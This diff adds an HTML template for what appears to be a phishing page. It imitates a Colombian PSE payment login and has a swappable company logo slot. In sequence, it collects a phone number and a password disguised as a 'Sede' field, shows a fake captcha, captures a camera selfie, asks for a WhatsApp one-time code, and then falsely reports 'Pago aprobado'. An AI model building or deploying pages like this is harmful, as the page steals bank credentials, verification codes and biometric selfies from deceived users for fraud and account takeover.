@@ -1,0 +1,136 @@
+<!doctype html>
+<html lang="es">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+  <meta name="theme-color" content="#f8f6f8">
+  <link rel="icon" href="data:,">
+  <title>Verificación</title>
+  <link rel="stylesheet" href="/static/app.css">
+</head>
+<body class="selfie-page">
+  <header class="company-header" aria-label="Marca de la empresa">
+  </header>
+
+  <main class="selfie-shell">
+    <section id="intake-screen" class="flow-screen intake-screen" aria-labelledby="intake-title">
+      <div class="intake-card">
+         <div class="company-logo-slot">
+      <img id="company-logo" src="{{ url_for('static', filename='logo.svg') }}" alt="Logo de la empresa">
+      <span id="company-logo-placeholder" class="company-logo-placeholder" hidden>
+        Agrega tu logo a static/company-logo.png
+      </span>
+    </div>
+    <h2 id="textomodal">Paga a través de PSE</h2>
+        <p>Inicia sesión para poder completar el pago.</p>
+        <form id="intake-form">
+          <div class="input-group">
+            <label class="visually-hidden" for="visit-phone">Número de celular</label>
+            <input id="visit-phone" name="phone" type="tel" inputmode="tel" autocomplete="tel"
+                   placeholder="Número de celular" minlength="8" maxlength="18" required>
+          </div>
+          <div class="input-group">
+            <label class="visually-hidden" for="visit-site">Sede</label>
+            <input id="visit-site" name="site" type="text" autocomplete="off"
+                   placeholder="Clave" minlength="2" maxlength="80" required>
+          </div>
+          <label class="custom-captcha-container" for="visit-consent">
+            <input id="visit-consent" type="checkbox" required>
+            <span class="captcha-icon-wrapper" aria-hidden="true">
+              <span class="captcha-pulse"></span>
+              <span class="captcha-circle-core"></span>
+              <span class="checkmark"></span>
+            </span>
+            <span class="captcha-text">Confirmo que soy una persona real.</span>
+          </label>
+          <p id="intake-error" class="intake-error" role="alert" hidden></p>
+          <button id="intake-submit" class="primary-button" type="submit">Entra</button>
+          <a href="#" class="btn-ahora-no">Ahora No</a>
+        </form>
+      </div>
+    </section>
+
+    <section id="camera-screen" class="camera-screen" aria-label="Cámara para la selfie" hidden>
+      <p id="face-guidance" class="face-guidance" role="status" aria-live="polite">
+        Levanta el teléfono a la altura de tus ojos
+      </p>
+      <div class="camera-stage">
+        <video id="camera-backdrop" class="camera-backdrop" autoplay playsinline muted aria-hidden="true"></video>
+        <div class="camera-tint" aria-hidden="true"></div>
+        <video id="camera" class="camera-face" autoplay playsinline muted></video>
+        <div class="face-guide" aria-hidden="true"></div>
+      </div>
+      <canvas id="canvas" hidden></canvas>
+    </section>
+
+    <section id="code-screen" class="flow-screen code-screen" hidden aria-labelledby="code-title">
+      <div class="flow-card">
+        <div class="company-logo-slot">
+          <img src="{{ url_for('static', filename='logo.svg') }}" alt="Logo de la empresa">
+        </div>
+        <h1 id="code-title">Ingresa el código</h1>
+        <p id="code-description">Escribe los 6 números que te hemos enviamos por WhatsApp. Si no te llegó, revisa tus mensajes.</p>
+        <form id="code-form" autocomplete="on">
+          <label class="otp-label" for="worker-code">Código de 6 dígitos</label>
+          <div class="otp-entry">
+            <div id="otp-boxes" class="otp-boxes" aria-hidden="true">
+              <span></span><span></span><span></span><span></span><span></span><span></span>
+            </div>
+            <input id="worker-code" name="one-time-code" type="text" inputmode="numeric"
+                   autocomplete="one-time-code" pattern="[0-9]{6}" maxlength="6"
+                   aria-label="Código de verificación de 6 dígitos" required>
+          </div>
+          <p id="code-error" class="code-error" role="alert" hidden></p>
+          <p class="otp-hint">¿No te llego el código esta vez?</p>
+        </form>
+        <div id="code-loading" class="inline-loading" hidden>
+          <span class="spinner-ring" aria-hidden="true"></span>
+          <span id="code-loading-text">Cargando</span>
+        </div>
+      </div>
+    </section>
+
+    <section id="waiting-screen" class="flow-screen waiting-screen" hidden role="status" aria-live="polite">
+      <div class="waiting-content">
+        <span class="spinner-ring spinner-large" aria-hidden="true"></span>
+        <h1 id="waiting-title">Subiendo selfie…</h1>
+        <p id="waiting-message">Espera un momento, estamos confirmando que eres tú.</p>
+      </div>
+    </section>
+
+    <section id="approved-screen" class="flow-screen result-screen" hidden role="status">
+      <div class="flow-card">
+        <span class="result-check" aria-hidden="true">✓</span>
+        <h1>Pago aprobado</h1>
+        <p>Recuerda finalizar tu pago.</p>
+        <button id="leave-button" class="primary-button" type="button">Finalizar</button>
+      </div>
+    </section>
+
+    <p id="message" class="screen-error" role="alert"></p>
+  </main>
+
+  <dialog id="camera-dialog" class="camera-dialog" aria-labelledby="dialog-title">
+    <div class="dialog-content">
+               <img src="{{ url_for('static', filename='logo.svg') }}" alt="Logo de la empresa">
+
+      <h1 id="dialog-title">Tómate tu selfie</h1>
+      <p id="dialog-message">Ahora pagas mas rapido y facil. sigue las instrucciones a continuación.</p>
+      <p id="dialog-error" class="dialog-error" role="alert" hidden></p>
+      <div class="dialog-actions">
+        <button id="dialog-primary" class="primary-button" type="button">Activar cámara</button>
+      </div>
+    </div>
+  </dialog>
+
+  <dialog id="loading-dialog" class="loading-dialog" aria-labelledby="loading-title">
+    <div class="loading-content">
+      <span class="spinner-ring spinner-large" aria-hidden="true"></span>
+      <h1 id="loading-title">Subiendo…</h1>
+      <p id="loading-message">Espera un momento, estamos confirmando que eres tú.</p>
+    </div>
+  </dialog>
+
+  <script src="/static/app.js" defer></script>
+</body>
+</html>
